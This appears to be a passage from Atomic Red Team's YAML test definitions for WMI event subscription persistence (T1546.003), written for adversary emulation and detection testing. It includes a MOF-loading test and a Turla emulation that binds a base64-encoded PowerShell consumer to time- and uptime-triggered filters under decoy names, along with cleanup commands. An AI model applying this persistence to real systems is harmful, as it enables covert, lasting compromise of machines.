- name: Windows MOFComp.exe Load MOF File
  auto_generated_guid: 29786d7e-8916-4de6-9c55-be7b093b2706
  description: |
    The following Atomic will utilize MOFComp.exe to load a local MOF file.
    The Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. 
    To query for the class:  gwmi __eventfilter -namespace root\subscription
    A successful execution will add the class to WMI root namespace.
    Reference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.
  supported_platforms:
  - windows
  input_arguments:
    mofcomp_path:
      description: Location of mofcomp.exe
      type: string
      default: c:\windows\system32\wbem\mofcomp.exe
    mof_file:
      description: Local location MOF file
      type: string
      default: PathToAtomicsFolder\T1546.003\src\T1546.003.mof
  dependency_executor_name: powershell
  dependencies:
  - description: |
      MofComp.exe must exist on disk at specified location (#{mofcomp_path})
    prereq_command: |
      if (Test-Path "#{mofcomp_path}") { exit 0} else { exit 1}
    get_prereq_command: |
      Validate MOFComp.exe is on disk somewhere and update input argument.
  - description: |
      MofComp.exe must exist on disk at specified location (#{mof_file})
    prereq_command: |
      if (Test-Path "#{mof_file}") { exit 0} else { exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path "#{mof_file}") -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.003/src/T1546.003.mof" -OutFile "#{mof_file}" -UseBasicParsing
  executor:
    command: |
      #{mofcomp_path} "#{mof_file}"
    cleanup_command: |
      $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam_consumer'"
      $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam_filter'"
      $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
      $FilterConsumerBindingToCleanup | Remove-WmiObject
      $EventConsumerToCleanup | Remove-WmiObject
      $EventFilterToCleanup | Remove-WmiObject
    name: powershell
- name: Turla WMI Persistence - Dual Filter with Base64 Payload
  auto_generated_guid: 67cee1c5-8c9b-460b-a4c3-76a6c69bcd15
  description: |
    Emulates WMI event subscription persistence used by Turla. Creates a single CommandLineEventConsumer
    with a base64-encoded PowerShell payload, then binds it to two event filters: one that triggers at a
    specific time of day (Win32_LocalTime) and one that triggers based on system uptime
    (Win32_PerfFormattedData_PerfOS_System).

    Reference: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
  supported_platforms:
  - windows
  input_arguments:
    benign_payload:
      description: Benign PowerShell command to base64-encode and use as the payload
      type: string
      default: Get-Date
  executor:
    name: powershell
    elevation_required: true
    command: |
      $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('#{benign_payload}'))
      $cmdLine = "$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -enc $encodedPayload"

      Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "name='Syslog Consumer'" | Remove-WmiObject
      $consumer = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{name='Syslog Consumer';CommandLineTemplate=$cmdLine;RunInteractively='false'}

      Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='Log Adapter Filter'" | Remove-WmiObject
      Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'Log Adapter'} | Remove-WmiObject
      $timeQuery = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40"
      $timeFilter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$timeQuery}
      Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$timeFilter;Consumer=$consumer}

      Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='AD Bridge Filter'" | Remove-WmiObject
      Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'AD Bridge'} | Remove-WmiObject
      $uptimeQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400"
      $uptimeFilter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='AD Bridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$uptimeQuery}
      Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$uptimeFilter;Consumer=$consumer}
    cleanup_command: |
      Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'Log Adapter'} | Remove-WmiObject
      Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'AD Bridge'} | Remove-WmiObject
      Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='Log Adapter Filter'" | Remove-WmiObject
      Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='AD Bridge Filter'" | Remove-WmiObject
      Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "name='Syslog Consumer'" | Remove-WmiObject
